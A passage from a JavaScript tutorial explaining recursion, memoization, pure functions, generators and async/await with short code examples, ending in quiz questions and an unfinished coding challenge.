    { value: 3, children: [{ value: 4 }, { value: 5 }] }
  ]
};

traverse(tree);  // 1, 2, 3, 4, 5
```

**Array flattening:**

```javascript
function flatten(array) {
  const result = [];
  
  for (let item of array) {
    if (Array.isArray(item)) {
      result.push(...flatten(item));  // Recursive
    } else {
      result.push(item);
    }
  }
  
  return result;
}

const nested = [1, [2, [3, [4]], 5]];
console.log(flatten(nested));  // [1, 2, 3, 4, 5]
```

---

### Tail Call Optimization (TCO)

**Tail call:** Recursive call is the last operation in the function.

```javascript
// NOT tail recursive (multiplication after recursive call)
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);  // Multiplication is last operation
}

// Tail recursive (recursive call is last operation)
function factorial(n, accumulator = 1) {
  if (n <= 1) return accumulator;
  return factorial(n - 1, n * accumulator);  // Recursive call is last
}
```

**JavaScript TCO support:**

- **ES6 spec** includes TCO
- **Most engines don't implement it** (only Safari does)
- **Don't rely on TCO** in JavaScript

---

### Mutual Recursion

**Functions call each other:**

```javascript
function isEven(n) {
  if (n === 0) return true;
  return isOdd(n - 1);
}

function isOdd(n) {
  if (n === 0) return false;
  return isEven(n - 1);
}

console.log(isEven(4));  // true
console.log(isOdd(7));   // true
```

---

### Stack Overflow

**Recursion can exhaust call stack:**

```javascript
function infinite() {
  return infinite();  // No base case!
}

infinite();  // RangeError: Maximum call stack size exceeded
```

**Solutions:**

1. **Add base case**
2. **Use iteration instead**
3. **Trampoline pattern** (for very deep recursion)

```javascript
function trampoline(fn) {
  while (typeof fn === "function") {
    fn = fn();
  }
  return fn;
}

function factorial(n, acc = 1) {
  if (n <= 1) return acc;
  return () => factorial(n - 1, n * acc);
}

console.log(trampoline(() => factorial(10000)));  // Works!
```

---

### 3.6.9 Memoization

### Definition

**Memoization** caches function results to avoid redundant computation.

---

### Basic Memoization

```javascript
function memoize(fn) {
  const cache = {};
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (key in cache) {
      console.log("Returning cached result");
      return cache[key];
    }
    
    console.log("Computing result");
    const result = fn(...args);
    cache[key] = result;
    return result;
  };
}

const slowSquare = memoize(function(x) {
  // Simulate slow operation
  for (let i = 0; i < 1000000000; i++) {}
  return x * x;
});

slowSquare(5);  // "Computing result" (slow)
slowSquare(5);  // "Returning cached result" (instant)
```

---

### Memoizing Recursive Functions

```javascript
const fibonacci = memoize(function(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
});

console.log(fibonacci(40));  // Fast! (without memo: very slow)
```

**Why it's fast:**

```
fibonacci(5)
â”œâ”€â”€ fibonacci(4) [computed]
â”‚   â”œâ”€â”€ fibonacci(3) [computed]
â”‚   â””â”€â”€ fibonacci(2) [computed]
â””â”€â”€ fibonacci(3) [cached!]

Each value computed only once, then cached
```

---

### Limitations

**1. Only works with pure functions** (same input â†’ same output)

**2. Memory usage:**

```javascript
// Cache grows indefinitely
const memoized = memoize(heavyFunction);

// Call with 1000 different inputs
// Cache now has 1000 entries
```

**3. Key generation:**

```javascript
// JSON.stringify doesn't work for all inputs
const fn = memoize(x => x);

fn({a: 1, b: 2});
fn({b: 2, a: 1});  // Same object, different JSON strings!
```

---

### Advanced Memoization

**LRU Cache (Least Recently Used):**

```javascript
function memoizeLRU(fn, maxSize = 100) {
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      const value = cache.get(key);
      // Move to end (most recently used)
      cache.delete(key);
      cache.set(key, value);
      return value;
    }
    
    const result = fn(...args);
    cache.set(key, result);
    
    // Remove oldest if exceeds max size
    if (cache.size > maxSize) {
      const firstKey = cache.keys().next().value;
      cache.delete(firstKey);
    }
    
    return result;
  };
}
```

---

### 3.6.10 Pure Functions and Side Effects

### Pure Functions

A **pure function**:

1. Returns same output for same input
2. Has no side effects

```javascript
// Pure
function add(a, b) {
  return a + b;
}

add(2, 3);  // Always 5
add(2, 3);  // Always 5

// Pure
function multiply(arr, factor) {
  return arr.map(x => x * factor);
}
```

---

### Impure Functions

**Depend on external state:**

```javascript
let count = 0;

function increment() {
  count++;  // Modifies external state
  return count;
}

increment();  // 1
increment();  // 2 (different output for same input!)
```

**Have side effects:**

```javascript
function logAndAdd(a, b) {
  console.log(`Adding ${a} + ${b}`);  // Side effect: I/O
  return a + b;
}

function updateUser(user) {
  user.updatedAt = Date.now();  // Side effect: mutation
  return user;
}

function fetchData(url) {
  return fetch(url);  // Side effect: network request
}
```

---

### Benefits of Pure Functions

1. **Predictable** (same input â†’ same output)
2. **Testable** (no setup needed)
3. **Cacheable** (can memoize)
4. **Parallelizable** (no shared state)
5. **Composable** (easy to combine)

```javascript
// Pure functions compose well
const double = x => x * 2;
const increment = x => x + 1;
const square = x => x * x;

const transform = compose(square, double, increment);
// Always produces same result for same input
```

---

### Managing Side Effects

**Isolate side effects:**

```javascript
// Pure computation
function calculateTotal(items) {
  return items.reduce((sum, item) => sum + item.price, 0);
}

// Impure I/O (separate)
function displayTotal(total) {
  document.getElementById("total").textContent = total;
}

// Usage
const total = calculateTotal(items);  // Pure
displayTotal(total);  // Impure, but isolated
```

---

### Immutability

**Don't mutate, create new values:**

```javascript
// Mutating (impure)
function addItem(cart, item) {
  cart.push(item);  // Mutates input
  return cart;
}

// Immutable (pure)
function addItem(cart, item) {
  return [...cart, item];  // Creates new array
}
```

---

## Summary

### Scope and Closures

- **Lexical scope**: Variable scope determined at write-time
- **Function scope**: `var` is function-scoped
- **Block scope**: `let`/`const` are block-scoped
- **Closures**: Functions retain access to lexical scope
- **Use cases**: Private data, factories, memoization, modules
- **Memory**: Closures retain references, can cause leaks

### Advanced Concepts

- **Higher-order functions**: Take/return functions
- **Callbacks**: Functions passed as arguments
- **Composition**: Combine functions into pipelines
- **Currying**: Transform multi-arg function into sequence of single-arg functions
- **Partial application**: Fix some arguments, return function expecting rest
- **Recursion**: Function calls itself (watch stack depth)
- **Memoization**: Cache results for performance
- **Pure functions**: No side effects, same input â†’ same output

---

## 3.7 Generator Functions


### 3.7.1 `function*` Syntax

### Basic Syntax

```javascript
function* generatorFunction() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = generatorFunction();
```

**Note the asterisk (`*`) - it can be positioned:**

```javascript
function* gen() { }   // Preferred
function *gen() { }   // Valid
function * gen() { }  // Valid
function*gen() { }    // Valid (no space)
```

---

### Generator as Method

```javascript
const obj = {
  *generator() {
    yield 1;
    yield 2;
  }
};

const gen = obj.generator();
```

---

### Generator as Class Method

```javascript
class MyClass {
  *generator() {
    yield 1;
    yield 2;
  }
  
  static *staticGenerator() {
    yield "a";
    yield "b";
  }
}

const instance = new MyClass();
const gen1 = instance.generator();
const gen2 = MyClass.staticGenerator();
```

---

### Generator vs Regular Function

```javascript
// Regular function: executes completely
function regular() {
  console.log("start");
  console.log("middle");
  console.log("end");
  return "done";
}

regular();  // Logs all three, returns "done"

// Generator function: can pause/resume
function* generator() {
  console.log("start");
  yield 1;
  console.log("middle");
  yield 2;
  console.log("end");
  return "done";
}

const gen = generator();  // Doesn't execute yet!
gen.next();  // Logs "start", returns { value: 1, done: false }
gen.next();  // Logs "middle", returns { value: 2, done: false }
gen.next();  // Logs "end", returns { value: "done", done: true }
```

---

### 3.7.2 `yield` Keyword

### Basic Usage

**`yield` produces a value and pauses execution:**

```javascript
function* counter() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = counter();

console.log(gen.next());  // { value: 1, done: false }
console.log(gen.next());  // { value: 2, done: false }
console.log(gen.next());  // { value: 3, done: false }
console.log(gen.next());  // { value: undefined, done: true }
```

---

### `yield` is an Expression

**`yield` can receive values:**

```javascript
function* twoWay() {
  const a = yield 1;
  console.log("Received:", a);
  
  const b = yield 2;
  console.log("Received:", b);
  
  return "done";
}

const gen = twoWay();

console.log(gen.next());      // { value: 1, done: false }
console.log(gen.next("A"));   // Logs "Received: A", { value: 2, done: false }
console.log(gen.next("B"));   // Logs "Received: B", { value: "done", done: true }
```

**How it works:**

1. First `next()`: Starts execution, pauses at first `yield 1`
2. Second `next("A")`: Resumes, `yield 1` returns `"A"`, assigned to `a`
3. Third `next("B")`: Resumes, `yield 2` returns `"B"`, assigned to `b`

---

### `yield` in Loops

```javascript
function* range(start, end) {
  for (let i = start; i < end; i++) {
    yield i;
  }
}

const gen = range(1, 5);

for (let value of gen) {
  console.log(value);
}
// 1, 2, 3, 4
```

---

### Multiple `yield` Statements

```javascript
function* fibonacci() {
  let a = 0, b = 1;
  
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();

console.log(fib.next().value);  // 0
console.log(fib.next().value);  // 1
console.log(fib.next().value);  // 1
console.log(fib.next().value);  // 2
console.log(fib.next().value);  // 3
console.log(fib.next().value);  // 5
```

---

### 3.7.3 `yield*` Delegation

### Delegating to Another Generator

**`yield*` delegates to another iterable:**

```javascript
function* gen1() {
  yield 1;
  yield 2;
}

function* gen2() {
  yield "a";
  yield* gen1();  // Delegate to gen1
  yield "b";
}

const gen = gen2();

console.log([...gen]);  // ["a", 1, 2, "b"]
```

---

### Delegating to Arrays

```javascript
function* gen() {
  yield 1;
  yield* [2, 3, 4];  // Delegate to array
  yield 5;
}

console.log([...gen()]);  // [1, 2, 3, 4, 5]
```

---

### Delegating to Strings

```javascript
function* gen() {
  yield* "hello";
}

console.log([...gen()]);  // ["h", "e", "l", "l", "o"]
```

---

### Nested Delegation

```javascript
function* inner() {
  yield 1;
  yield 2;
}

function* middle() {
  yield "a";
  yield* inner();
  yield "b";
}

function* outer() {
  yield "start";
  yield* middle();
  yield "end";
}

console.log([...outer()]);
// ["start", "a", 1, 2, "b", "end"]
```

---

### Return Value from Delegation

**`yield*` returns the delegated generator's return value:**

```javascript
function* inner() {
  yield 1;
  yield 2;
  return "inner done";
}

function* outer() {
  const result = yield* inner();
  console.log(result);  // "inner done"
  yield 3;
}

const gen = outer();

console.log(gen.next());  // { value: 1, done: false }
console.log(gen.next());  // { value: 2, done: false }
console.log(gen.next());  // Logs "inner done", { value: 3, done: false }
console.log(gen.next());  // { value: undefined, done: true }
```

---

### 3.7.4 Generator Methods

### `next(value)` Method

**Advance generator and optionally pass value:**

```javascript
function* gen() {
  const a = yield 1;
  console.log("a:", a);
  
  const b = yield 2;
  console.log("b:", b);
  
  return "done";
}

const g = gen();

g.next();        // { value: 1, done: false }
g.next("first"); // Logs "a: first", { value: 2, done: false }
g.next("second");// Logs "b: second", { value: "done", done: true }
```

**First `next()` doesn't receive a value:**

```javascript
function* gen() {
  const first = yield 1;
  console.log("Never sees the value passed to first next()");
}

const g = gen();
g.next("ignored");  // Value ignored (no yield to receive it yet)
```

---

### `return(value)` Method

**Terminate generator and return value:**

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

const g = gen();

console.log(g.next());         // { value: 1, done: false }
console.log(g.return("early")); // { value: "early", done: true }
console.log(g.next());         // { value: undefined, done: true }
```

**With `try...finally`:**

```javascript
function* gen() {
  try {
    yield 1;
    yield 2;
  } finally {
    console.log("Cleanup");
  }
}

const g = gen();

console.log(g.next());    // { value: 1, done: false }
console.log(g.return(0)); // Logs "Cleanup", { value: 0, done: true }
```

---

### `throw(error)` Method

**Throw error inside generator:**

```javascript
function* gen() {
  try {
    yield 1;
    yield 2;
    yield 3;
  } catch (error) {
    console.log("Caught:", error.message);
    yield "error handled";
  }
}

const g = gen();

console.log(g.next());  // { value: 1, done: false }
console.log(g.throw(new Error("oops")));
// Logs "Caught: oops"
// { value: "error handled", done: false }
console.log(g.next());  // { value: undefined, done: true }
```

**Uncaught error terminates generator:**

```javascript
function* gen() {
  yield 1;
  yield 2;
}

const g = gen();

console.log(g.next());  // { value: 1, done: false }
g.throw(new Error("oops"));  // Error propagates to caller
```

---

### 3.7.5 Iterating Generators

### Manual Iteration

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

const g = gen();

let result = g.next();
while (!result.done) {
  console.log(result.value);
  result = g.next();
}
// 1, 2, 3
```

---

### `for...of` Loop

**Automatically iterates until `done: true`:**

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
  return "ignored";  // Return value not included in for...of
}

for (let value of gen()) {
  console.log(value);
}
// 1, 2, 3
```

---

### Spread Operator

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

const arr = [...gen()];
console.log(arr);  // [1, 2, 3]
```

---

### Destructuring

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

const [a, b, c] = gen();
console.log(a, b, c);  // 1, 2, 3
```

---

### `Array.from()`

```javascript
function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

const arr = Array.from(gen());
console.log(arr);  // [1, 2, 3]
```

---

### 3.7.6 Use Cases

### Lazy Evaluation

**Generate values on-demand:**

```javascript
function* fibonacci() {
  let a = 0, b = 1;
  
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

// Take first 10 Fibonacci numbers
const fib = fibonacci();
const first10 = [];

for (let i = 0; i < 10; i++) {
  first10.push(fib.next().value);
}

console.log(first10);
// [0, 1, 1, 2, 3, 5, 8, 13, 21, 34]
```

---

### Infinite Sequences

```javascript
function* naturalNumbers() {
  let n = 1;
  while (true) {
    yield n++;
  }
}

// Take first 5
const nums = naturalNumbers();
const first5 = [
  nums.next().value,
  nums.next().value,
  nums.next().value,
  nums.next().value,
  nums.next().value
];

console.log(first5);  // [1, 2, 3, 4, 5]

// Helper to take n values
function take(n, iterable) {
  const result = [];
  const iterator = iterable[Symbol.iterator]();
  
  for (let i = 0; i < n; i++) {
    const { value, done } = iterator.next();
    if (done) break;
    result.push(value);
  }
  
  return result;
}

console.log(take(10, naturalNumbers()));
// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
```

---

### Custom Iterables

```javascript
class Range {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
  }
  
  *[Symbol.iterator]() {
    for (let i = this.start; i < this.end; i += this.step) {
      yield i;
    }
  }
}

const range = new Range(0, 10, 2);

for (let n of range) {
  console.log(n);
}
// 0, 2, 4, 6, 8

console.log([...range]);  // [0, 2, 4, 6, 8]
```

---

### Tree Traversal

```javascript
class TreeNode {
  constructor(value, children = []) {
    this.value = value;
    this.children = children;
  }
  
  *traverse() {
    yield this.value;
    
    for (let child of this.children) {
      yield* child.traverse();
    }
  }
}

const tree = new TreeNode(1, [
  new TreeNode(2, [
    new TreeNode(4),
    new TreeNode(5)
  ]),
  new TreeNode(3, [
    new TreeNode(6)
  ])
]);

console.log([...tree.traverse()]);
// [1, 2, 4, 5, 3, 6]
```

---

### State Machines

```javascript
function* trafficLight() {
  while (true) {
    yield "green";
    yield "yellow";
    yield "red";
  }
}

const light = trafficLight();

console.log(light.next().value);  // "green"
console.log(light.next().value);  // "yellow"
console.log(light.next().value);  // "red"
console.log(light.next().value);  // "green"
```

---

### Pulling Data (Pull-Based)

```javascript
function* dataFetcher() {
  let page = 1;
  
  while (true) {
    const data = yield fetch(`/api/data?page=${page}`);
    page++;
  }
}

const fetcher = dataFetcher();
fetcher.next();  // Start generator

// Pull data when needed
const response1 = fetcher.next().value;  // Fetch page 1
const response2 = fetcher.next().value;  // Fetch page 2
```

---

### Cooperative Multitasking

```javascript
function* task1() {
  console.log("Task 1: Start");
  yield;
  console.log("Task 1: Middle");
  yield;
  console.log("Task 1: End");
}

function* task2() {
  console.log("Task 2: Start");
  yield;
  console.log("Task 2: Middle");
  yield;
  console.log("Task 2: End");
}

function runTasks(...tasks) {
  const generators = tasks.map(task => task());
  
  while (generators.length > 0) {
    for (let i = generators.length - 1; i >= 0; i--) {
      const { done } = generators[i].next();
      if (done) {
        generators.splice(i, 1);
      }
    }
  }
}

runTasks(task1, task2);
// Task 1: Start
// Task 2: Start
// Task 1: Middle
// Task 2: Middle
// Task 1: End
// Task 2: End
```

---

### 3.7.7 Generator Best Practices

1. **Use for lazy evaluation** (don't compute everything upfront)
2. **Document infinite sequences** (make it clear they're infinite)
3. **Use `yield*` for delegation** (cleaner than manual yielding)
4. **Handle cleanup in `finally`** (runs even if generator terminated early)
5. **Return meaningful values** (for `yield*` delegation)
6. **Prefer `for...of`** over manual `next()` calls
7. **Use generators for custom iterables** (cleaner than manual iterator protocol)

---


## 3.8 Async Functions


### 3.8.1 `async` Keyword

### Basic Syntax

```javascript
async function fetchUser() {
  return { id: 1, name: "Alice" };
}

const result = fetchUser();
console.log(result);  // Promise { <fulfilled>: { id: 1, name: "Alice" } }
```

**`async` function always returns a Promise:**

```javascript
async function getValue() {
  return 42;
}

// Equivalent to:
function getValue() {
  return Promise.resolve(42);
}

getValue().then(value => console.log(value));  // 42
```

---

### Async Function Expressions

```javascript
const fetchUser = async function() {
  return { id: 1, name: "Alice" };
};

const getData = async () => {
  return [1, 2, 3];
};
```

---

### Async Methods

```javascript
const obj = {
  async fetchData() {
    return "data";
  }
};

class MyClass {
  async fetchData() {
    return "data";
  }
  
  static async staticFetch() {
    return "static data";
  }
}
```

---

### Throwing Errors

**Throwing in async function creates rejected promise:**

```javascript
async function failingFunction() {
  throw new Error("oops");
}

failingFunction().catch(error => {
  console.log(error.message);  // "oops"
});

// Equivalent to:
function failingFunction() {
  return Promise.reject(new Error("oops"));
}
```

---

### 3.8.2 `await` Keyword

### Basic Usage

**`await` pauses execution until promise settles:**

```javascript
async function fetchUser() {
  const response = await fetch("https://api.example.com/user/1");
  const user = await response.json();
  return user;
}

fetchUser().then(user => console.log(user));
```

**Without `await` (for comparison):**

```javascript
function fetchUser() {
  return fetch("https://api.example.com/user/1")
    .then(response => response.json())
    .then(user => user);
}
```

---

### `await` Unwraps Promises

```javascript
async function example() {
  const promise = Promise.resolve(42);
  const value = await promise;
  console.log(value);  // 42 (not Promise)
}

example();
```

---

### Multiple `await` Statements

**Sequential (one after another):**

```javascript
async function fetchUsers() {
  const user1 = await fetch("/api/user/1").then(r => r.json());
  const user2 = await fetch("/api/user/2").then(r => r.json());
  const user3 = await fetch("/api/user/3").then(r => r.json());
  
  return [user1, user2, user3];
}

// Takes 3 * request_time (sequential)
```

**Parallel (concurrent):**

```javascript
async function fetchUsers() {
  const [user1, user2, user3] = await Promise.all([
    fetch("/api/user/1").then(r => r.json()),
    fetch("/api/user/2").then(r => r.json()),
    fetch("/api/user/3").then(r => r.json())
  ]);
  
  return [user1, user2, user3];
}

// Takes max(request_times) (parallel)
```

---

### `await` Only in Async Functions

```javascript
// Error: await outside async function
function regular() {
  const value = await Promise.resolve(42);  // SyntaxError
}

// Correct: await inside async function
async function asyncFunc() {
  const value = await Promise.resolve(42);  // OK
}
```

**Exception: Top-level await (see 3.8.4)**

---

### `await` with Non-Promises

**Works with any value (wraps in resolved promise):**

```javascript
async function example() {
  const value = await 42;  // Wrapped in Promise.resolve(42)
  console.log(value);  // 42
  
  const str = await "hello";
  console.log(str);  // "hello"
}
```

---

### 3.8.3 Error Handling

### `try...catch`

**Handle rejected promises:**

```javascript
async function fetchUser(id) {
  try {
    const response = await fetch(`/api/user/${id}`);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const user = await response.json();
    return user;
  } catch (error) {
    console.error("Failed to fetch user:", error.message);
    return null;
  }
}

fetchUser(1);
```

---

### Multiple Try-Catch Blocks

```javascript
async function complexOperation() {
  let user, posts;
  
  try {
    user = await fetchUser();
  } catch (error) {
    console.error("User fetch failed:", error);
    return;
  }
  
  try {
    posts = await fetchPosts(user.id);
  } catch (error) {
    console.error("Posts fetch failed:", error);
    posts = [];  // Use default
  }
  
  return { user, posts };
}
```

---

### `.catch()` on Promises

**Mix await with promise methods:**

```javascript
async function fetchUser(id) {
  const user = await fetch(`/api/user/${id}`)
    .then(r => r.json())
    .catch(error => {
      console.error("Fetch failed:", error);
      return null;
    });
  
  return user;
}
```

---

### Uncaught Errors

**Errors propagate to returned promise:**

```javascript
async function failing() {
  throw new Error("oops");
}

failing();  // Unhandled promise rejection

// Handle with .catch()
failing().catch(error => console.error(error));

// Or with await in async context
async function caller() {
  try {
    await failing();
  } catch (error) {
    console.error("Caught:", error.message);
  }
}
```

---

### `finally` Block

```javascript
async function fetchWithCleanup() {
  let connection;
  
  try {
    connection = await openConnection();
    const data = await connection.query("SELECT * FROM users");
    return data;
  } catch (error) {
    console.error("Query failed:", error);
    throw error;
  } finally {
    if (connection) {
      await connection.close();  // Always runs
    }
  }
}
```

---

### 3.8.4 Top-Level `await`

### ES2022 Feature

**Use `await` at module top level:**

```javascript
// config.js (ES module)
const response = await fetch("/api/config");
const config = await response.json();

export default config;

// main.js
import config from "./config.js";
console.log(config);  // Available immediately
```

---

### Dynamic Imports

```javascript
const { default: module } = await import("./module.js");

// Conditional loading
if (condition) {
  const module = await import("./conditional-module.js");
  module.doSomething();
}
```

---

### Module Initialization

```javascript
// database.js
const connection = await connectToDatabase();
await connection.migrate();

export default connection;

// Using module
import db from "./database.js";
// db is already initialized and migrated
```

---

### Limitations

**Only in ES modules:**

```html
<!-- Works: type="module" -->
<script type="module">
  const data = await fetch("/api/data").then(r => r.json());
  console.log(data);
</script>

<!-- Doesn't work: regular script -->
<script>
  const data = await fetch("/api/data");  // SyntaxError
</script>
```

**Not in CommonJS:**

```javascript
// module.cjs (CommonJS)
const data = await fetch("/api/data");  // SyntaxError

// Use IIFE instead
(async () => {
  const data = await fetch("/api/data");
})();
```

---

### Load Order Dependencies

**Modules with top-level await block importing modules:**

```javascript
// slow-module.js
await new Promise(resolve => setTimeout(resolve, 2000));
export const data = "slow data";

// fast-module.js
export const data = "fast data";

// main.js
import { data as slowData } from "./slow-module.js";
import { data as fastData } from "./fast-module.js";

console.log(slowData, fastData);
// Takes 2 seconds (waits for slow-module)
```

---

### 3.8.5 Async Generators

### `async function*` Syntax

**Combine async and generator:**

```javascript
async function* asyncGenerator() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
  yield await Promise.resolve(3);
}

// Consume with for await...of
(async () => {
  for await (let value of asyncGenerator()) {
    console.log(value);
  }
})();
// 1 (after delay)
// 2 (after delay)
// 3 (after delay)
```

---

### Async Iteration

```javascript
async function* fetchPages() {
  let page = 1;
  
  while (page <= 3) {
    const response = await fetch(`/api/data?page=${page}`);
    const data = await response.json();
    yield data;
    page++;
  }
}

(async () => {
  for await (let pageData of fetchPages()) {
    console.log(pageData);
  }
})();
```

---

### Real-World Example: Streaming

```javascript
async function* readLines(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = "";
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) {
      if (buffer.length > 0) {
        yield buffer;
      }
      break;
    }
    
    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split("\n");
    buffer = lines.pop();  // Keep incomplete line
    
    for (let line of lines) {
      yield line;
    }
  }
}

// Usage
(async () => {
  for await (let line of readLines("/data.txt")) {
    console.log(line);
  }
})();
```

---

### Async Generator Methods

**Similar to regular generators:**

```javascript
async function* gen() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
}

const g = gen();

// next()
g.next().then(result => console.log(result));
// { value: 1, done: false }

// return()
g.return(0).then(result => console.log(result));
// { value: 0, done: true }

// throw()
async function* errorGen() {
  try {
    yield await Promise.resolve(1);
    yield await Promise.resolve(2);
  } catch (error) {
    console.log("Caught:", error.message);
  }
}

const eg = errorGen();
await eg.next();
await eg.throw(new Error("oops"));
// Logs "Caught: oops"
```

---

### Delegating with `yield*`

```javascript
async function* inner() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
}

async function* outer() {
  yield await Promise.resolve("start");
  yield* inner();
  yield await Promise.resolve("end");
}

(async () => {
  for await (let value of outer()) {
    console.log(value);
  }
})();
// "start", 1, 2, "end"
```

---

### 3.8.6 Async Patterns

### Sequential Execution

```javascript
async function sequential() {
  const result1 = await operation1();
  const result2 = await operation2(result1);
  const result3 = await operation3(result2);
  return result3;
}
```

---

### Parallel Execution

```javascript
async function parallel() {
  const [result1, result2, result3] = await Promise.all([
    operation1(),
    operation2(),
    operation3()
  ]);
  
  return { result1, result2, result3 };
}
```

---

### Race Conditions

```javascript
async function fastest() {
  const result = await Promise.race([
    fetchFromServer1(),
    fetchFromServer2(),
    fetchFromServer3()
  ]);
  
  return result;  // First to complete
}
```

---

### Retry Logic

```javascript
async function retry(fn, maxAttempts = 3, delay = 1000) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (attempt === maxAttempts) throw error;
      
      console.log(`Attempt ${attempt} failed, retrying...`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Usage
const data = await retry(() => fetch("/api/data").then(r => r.json()));
```

---

### Timeout

```javascript
function timeout(ms, promise) {
  return Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Timeout")), ms)
    )
  ]);
}

async function fetchWithTimeout() {
  try {
    const data = await timeout(5000, fetch("/api/data"));
    return data;
  } catch (error) {
    console.error("Request timed out");
  }
}
```

---

### Cancellation

```javascript
async function cancellable(signal) {
  if (signal.aborted) {
    throw new Error("Aborted");
  }
  
  const response = await fetch("/api/data", { signal });
  return response.json();
}

// Usage
const controller = new AbortController();

setTimeout(() => controller.abort(), 5000);  // Cancel after 5s

try {
  const data = await cancellable(controller.signal);
} catch (error) {
  console.log("Request cancelled");
}
```

---

### 3.8.7 Best Practices

1. **Use `async`/`await` over promise chains** (more readable)
2. **Handle errors with `try...catch`** (don't let them go unhandled)
3. **Run independent operations in parallel** (use `Promise.all`)
4. **Don't `await` in loops unnecessarily** (leads to sequential execution)
5. **Use `Promise.allSettled`** when you want all results (even failures)
6. **Be careful with top-level `await`** (blocks module loading)
7. **Clean up resources in `finally`**
8. **Consider cancellation** for long-running operations

---

### 3.8.8 Common Pitfalls

### Forgetting `await`

```javascript
// Bug: forgot await
async function fetchUser() {
  const user = fetch("/api/user/1");  // Returns Promise, not user!
  console.log(user.name);  // undefined
}

// Correct
async function fetchUser() {
  const response = await fetch("/api/user/1");
  const user = await response.json();
  console.log(user.name);
}
```

---

### Sequential Instead of Parallel

```javascript
// Slow: sequential (3 seconds total)
async function slow() {
  const user1 = await fetchUser(1);  // 1 second
  const user2 = await fetchUser(2);  // 1 second
  const user3 = await fetchUser(3);  // 1 second
  return [user1, user2, user3];
}

// Fast: parallel (1 second total)
async function fast() {
  const [user1, user2, user3] = await Promise.all([
    fetchUser(1),
    fetchUser(2),
    fetchUser(3)
  ]);
  return [user1, user2, user3];
}
```

---

### Not Handling Rejections

```javascript
// Bug: unhandled rejection
async function bad() {
  const data = await fetch("/api/data");  // Might fail
  return data;
}

bad();  // If fetch fails, unhandled promise rejection

// Good: handle errors
async function good() {
  try {
    const response = await fetch("/api/data");
    if (!response.ok) throw new Error("Fetch failed");
    return await response.json();
  } catch (error) {
    console.error("Error:", error);
    return null;
  }
}
```

---

## Summary

### Generators

- **`function*` syntax** creates generator functions
- **`yield`** pauses execution and produces value
- **`yield*`** delegates to another iterable
- **Methods**: `next()`, `return()`, `throw()`
- **Use cases**: lazy evaluation, infinite sequences, custom iterables
- **Iteration**: `for...of`, spread, destructuring

### Async Functions

- **`async`** makes function return Promise
- **`await`** pauses until Promise settles
- **Error handling**: `try...catch` or `.catch()`
- **Top-level `await`** in ES modules
- **Async generators** combine async and generators
- **Patterns**: sequential, parallel, race, retry, timeout
- **Common pitfalls**: forgetting `await`, sequential instead of parallel, unhandled rejections

---


## 3.9 Functions Summary

| Concept | Key Points |
|---------|------------|
| **Declarations vs Expressions** | Declarations hoisted; expressions not |
| **Arrow Functions** | Lexical `this`; no `arguments`; can't be constructors |
| **Parameters** | Default values, rest params, destructuring |
| **Closures** | Functions retain access to outer scope |
| **Higher-Order Functions** | Functions that take/return functions |
| **Currying** | Transform f(a,b,c) to f(a)(b)(c) |
| **Generators** | Pause/resume with `yield`; return iterators |
| **Async Functions** | `async`/`await` for promise-based code |

### Best Practices

1. **Use arrow functions** for callbacks and short functions
2. **Use `function` declarations** for top-level, named functions
3. **Default parameters** over checking `undefined`
4. **Rest parameters** over `arguments` object
5. **Destructure** complex parameters
6. **Keep closures lean** â€” capture only needed variables
7. **Use `Promise.all()`** for parallel async operations
8. **Always handle errors** in async functions

---

## Mastery Check

### Quiz Questions

**Q1:** What does this output?
```javascript
const funcs = [];
for (var i = 0; i < 3; i++) {
  funcs.push(() => i);
}
console.log(funcs.map(f => f()));
```

<details>
<summary>Answer</summary>

`[3, 3, 3]` â€” `var` is function-scoped, so all closures capture the same `i` which ends up as 3. Using `let` would give `[0, 1, 2]`.
</details>

**Q2:** What's the value of `this` in each call?
```javascript
const obj = {
  name: 'Alice',
  greet: function() { return this.name; },
  greetArrow: () => this.name
};

console.log(obj.greet());
console.log(obj.greetArrow());

const greet = obj.greet;
console.log(greet());
```

<details>
<summary>Answer</summary>

```javascript
console.log(obj.greet());       // "Alice" (this = obj)
console.log(obj.greetArrow());  // undefined (arrow captures outer this, not obj)
console.log(greet());           // undefined (this = globalThis in non-strict, TypeError in strict)
```
</details>

**Q3:** Explain the difference:
```javascript
function* gen() {
  yield 1;
  yield 2;
  return 3;
}

console.log([...gen()]);
```

<details>
<summary>Answer</summary>

`[1, 2]` â€” The spread operator only collects `yield` values where `done: false`. The `return 3` produces `{ value: 3, done: true }` which is ignored by spread/for-of.
</details>

**Q4:** What happens here?
```javascript
async function fetchData() {
  const result = await Promise.reject('Error!');
  return result;
}

fetchData().then(console.log).catch(console.error);
```

<details>
<summary>Answer</summary>

Logs `"Error!"` via `catch`. The `await` on a rejected promise throws, which rejects the async function's returned promise. Without try-catch inside, the error propagates.
</details>

### Coding Challenges

**Challenge 1:** Implement `memoize(fn)` that caches function results based on arguments.

<details>
